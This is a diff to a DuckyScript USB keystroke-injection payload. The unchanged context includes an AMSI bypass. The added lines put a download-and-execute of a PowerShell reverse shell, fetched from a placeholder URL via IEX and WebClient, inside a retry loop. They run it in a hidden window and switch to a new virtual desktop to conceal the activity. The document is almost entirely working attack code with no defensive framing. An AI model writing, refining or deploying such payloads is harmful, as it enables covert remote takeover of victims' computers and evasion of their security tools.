@@ -46,12 +46,15 @@ STRING [Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 
 REM Bypass AMSI
 DELAY 500
 Enter
-STRING $Process = IEX(New-Object System.Net.WebClient).DownloadString('{REV_PS1_URL}')
+STRING $loop={$success=$false;while(-not $success){try{$Process=IEX(New-Object System.Net.WebClient).DownloadString('{REV_PS1_URL}');$success=$true}catch{Start-Sleep -Seconds 1}}}
 REM Download, execute powershell reverseshell payload, and store in $Process
 DELAY 500
 ENTER
 DELAY 500
-STRING powershell -windowstyle hidden $Process 
+STRING powershell -windowstyle hidden (& $loop)
 REM Close Powershell window, keeping process open in the background
 ENTER
+DELAY 200
+WINDOWS CTRL D
+DELAY 200
 REM End Payload 
